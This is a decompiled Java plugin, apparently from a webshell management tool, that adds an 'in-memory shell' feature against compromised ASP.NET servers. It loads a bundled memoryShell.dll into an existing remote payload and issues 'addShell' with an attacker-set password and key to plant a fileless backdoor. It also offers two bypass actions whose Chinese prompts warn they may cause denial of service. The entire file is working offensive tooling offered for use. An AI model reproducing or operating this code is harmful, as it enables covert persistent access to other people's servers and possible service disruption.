/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.cshap;

import com.intellij.uiDesigner.core.GridConstraints;
import com.intellij.uiDesigner.core.GridLayoutManager;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.dialog.GOptionPane;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.util.Arrays;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JComponent;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JTextField;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName="CShapDynamicPayload", Name="MemoryShell", DisplayName="\u5185\u5b58Shell")
public class MemoryShell
implements Plugin {
    private static final String[] MemoryShellTYPES = new String[]{"CSHARP_AES_BASE64"};
    private static final String CLASS_NAME = "memoryShell.Run";
    public JPanel mainPanel;
    public JTextField passwordTextField;
    public JTextField keyTextField;
    public JPanel corePanel;
    public JLabel passwordLabel;
    public JLabel memoryShellTypeLabel;
    public JComboBox memoryShellTypeComboBox;
    public JButton addMemoryShellButton;
    public JButton bypassFriendlyUrlRouteButton;
    public JButton bypassPrecompiledAppButton;
    public ShellEntity shellEntity;
    public Payload payload;
    public boolean load;

    public MemoryShell() {
        this.$$$setupUI$$$();
        Arrays.stream(MemoryShellTYPES).forEach(type -> this.memoryShellTypeComboBox.addItem(type));
    }

    private boolean load() {
        try {
            if (!this.load) {
                this.load = this.payload.include(CLASS_NAME, functions.readInputStreamAutoClose(MemoryShell.class.getResourceAsStream(String.format("assets/memoryShell.dll", new Object[0]))));
            }
        } catch (Exception e) {
            e.printStackTrace();
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            PrintStream printStream = new PrintStream(stream);
            e.printStackTrace(printStream);
            printStream.flush();
            printStream.close();
            JOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), new String(stream.toByteArray()));
        }
        return this.load;
    }

    private void addMemoryShellButtonClick(ActionEvent actionEvent) {
        if (this.load()) {
            String password = this.passwordTextField.getText().trim();
            String key = this.keyTextField.getText().trim();
            if (password.isEmpty() || key.isEmpty()) {
                GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), "\u5bc6\u7801\u6216\u5bc6\u94a5\u662f\u7a7a\u7684");
                return;
            }
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("password", password);
            reqParameter.add("key", functions.md5(key).substring(0, 16));
            reqParameter.add("action", "addShell");
            String result = new String(this.payload.evalFunc(CLASS_NAME, "addShell", reqParameter));
            GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), result);
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), "\u63d2\u4ef6\u52a0\u8f7d\u5931\u8d25");
        }
    }

    private void bypassFriendlyUrlRouteButtonClick(ActionEvent actionEvent) {
        if (this.load()) {
            int flag = GOptionPane.showConfirmDialog(UiFunction.getParentWindow(this.mainPanel), "\u5982\u679c\u4f60\u4e0d\u77e5\u9053\u8fd9\u4e2a\u529f\u80fd\u662f\u505a\u4ec0\u4e48\u7684\u8bf7\u4e0d\u8981\u70b9\u51fb! \u8fd9\u53ef\u80fd\u4f1a\u5f15\u8d77\u62d2\u7edd\u670d\u52a1!");
            if (flag != 0) {
                return;
            }
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("action", "bypassFriendlyUrlRoute");
            String result = new String(this.payload.evalFunc(CLASS_NAME, "bypassFriendlyUrlRoute", reqParameter));
            GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), result);
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), "\u63d2\u4ef6\u52a0\u8f7d\u5931\u8d25");
        }
    }

    private void bypassPrecompiledAppButtonClick(ActionEvent actionEvent) {
        if (this.load()) {
            int flag = GOptionPane.showConfirmDialog(UiFunction.getParentWindow(this.mainPanel), "\u5982\u679c\u4f60\u4e0d\u77e5\u9053\u8fd9\u4e2a\u529f\u80fd\u662f\u505a\u4ec0\u4e48\u7684\u8bf7\u4e0d\u8981\u70b9\u51fb! \u8fd9\u53ef\u80fd\u4f1a\u5f15\u8d77\u62d2\u7edd\u670d\u52a1!");
            if (flag != 0) {
                return;
            }
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("action", "bypassPrecompiledApp");
            String result = new String(this.payload.evalFunc(CLASS_NAME, "bypassPrecompiledApp", reqParameter));
            GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), result);
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), "\u63d2\u4ef6\u52a0\u8f7d\u5931\u8d25");
        }
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = shellEntity.getPayloadModule();
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        return this.mainPanel;
    }

    private void $$$setupUI$$$() {
        this.mainPanel = new JPanel();
        this.mainPanel.setLayout(new GridLayoutManager(1, 1, new Insets(0, 0, 0, 0), -1, -1, true, true));
        this.corePanel = new JPanel();
        this.corePanel.setLayout(new GridLayoutManager(6, 2, new Insets(0, 0, 0, 0), -1, -1));
        this.mainPanel.add((Component)this.corePanel, new GridConstraints(0, 0, 1, 1, 0, 0, 3, 3, null, null, null, 0, false));
        this.passwordLabel = new JLabel();
        this.passwordLabel.setText("\u5bc6\u7801:");
        this.corePanel.add((Component)this.passwordLabel, new GridConstraints(0, 0, 1, 1, 8, 0, 0, 0, null, null, null, 0, false));
        this.passwordTextField = new JTextField();
        this.passwordTextField.setText("pass");
        this.corePanel.add((Component)this.passwordTextField, new GridConstraints(0, 1, 1, 1, 8, 1, 4, 0, null, new Dimension(150, -1), null, 0, false));
        JLabel label1 = new JLabel();
        label1.setText("\u5bc6\u94a5:");
        this.corePanel.add((Component)label1, new GridConstraints(1, 0, 1, 1, 8, 0, 0, 0, null, null, null, 0, false));
        this.keyTextField = new JTextField();
        this.keyTextField.setText("key");
        this.corePanel.add((Component)this.keyTextField, new GridConstraints(1, 1, 1, 1, 0, 1, 4, 0, null, new Dimension(150, -1), null, 0, false));
        this.memoryShellTypeLabel = new JLabel();
        this.memoryShellTypeLabel.setText("Shell\u7c7b\u578b");
        this.corePanel.add((Component)this.memoryShellTypeLabel, new GridConstraints(2, 0, 1, 1, 8, 0, 0, 0, null, null, null, 0, false));
        this.memoryShellTypeComboBox = new JComboBox();
        this.corePanel.add((Component)this.memoryShellTypeComboBox, new GridConstraints(2, 1, 1, 1, 8, 1, 2, 0, null, null, null, 0, false));
        this.addMemoryShellButton = new JButton();
        this.addMemoryShellButton.setText("\u6dfb\u52a0\u5185\u5b58Shell");
        this.corePanel.add((Component)this.addMemoryShellButton, new GridConstraints(5, 0, 1, 2, 0, 1, 3, 0, null, null, null, 0, false));
        this.bypassFriendlyUrlRouteButton = new JButton();
        this.bypassFriendlyUrlRouteButton.setText("bypassFriendlyUrlRoute");
        this.corePanel.add((Component)this.bypassFriendlyUrlRouteButton, new GridConstraints(3, 0, 1, 2, 0, 1, 3, 0, null, null, null, 0, false));
        this.bypassPrecompiledAppButton = new JButton();
        this.bypassPrecompiledAppButton.setText("bypassPrecompiledApp");
        this.corePanel.add((Component)this.bypassPrecompiledAppButton, new GridConstraints(4, 0, 1, 2, 0, 1, 3, 0, null, null, null, 0, false));
    }

    public JComponent $$$getRootComponent$$$() {
        return this.mainPanel;
    }
}

